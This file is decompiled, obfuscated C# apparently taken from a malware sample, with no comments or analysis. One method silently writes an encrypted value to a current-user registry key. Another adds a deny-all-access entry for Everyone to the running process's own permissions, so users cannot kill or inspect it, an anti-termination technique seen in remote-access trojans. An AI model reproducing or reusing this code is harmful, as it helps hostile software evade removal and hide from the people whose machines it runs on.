using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GfIOnzejDqtqB;

internal sealed class pOcbdqQtgbmv
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr nLxYoGsDDcKy, int MPubtmuuQfZv, [Out] byte[] RXiQJJUapvflY, uint KEUXiJFvDaV, out uint AMXZPROOjm);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr pFrZbiZEITcZc, int WZKyBfXdHWhVM, [In] byte[] PvIEnptLqSF);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void tAxJtIKkrFlcb(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(XpwFCiWTIXog.pimTPtzgsj(getString_0(107406152)));
			registryKey.SetValue(XpwFCiWTIXog.pimTPtzgsj(getString_0(107406047)), getString_0(107407368));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor tXjmZKkXRRWT(IntPtr intptr_0)
	{
		byte[] rXiQJJUapvflY = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, rXiQJJUapvflY, 0u, out var AMXZPROOjm);
		if ((long)AMXZPROOjm > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, rXiQJJUapvflY = new byte[AMXZPROOjm], AMXZPROOjm, out AMXZPROOjm))
		{
			return null;
		}
		return new RawSecurityDescriptor(rXiQJJUapvflY, 0);
	}

	private void mBpLNQFTROkSoHs(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void vdKFgKSVCWgW()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = tXjmZKkXRRWT(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			mBpLNQFTROkSoHs(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static pOcbdqQtgbmv()
	{
		Strings.CreateGetStringDelegate(typeof(pOcbdqQtgbmv));
	}
}
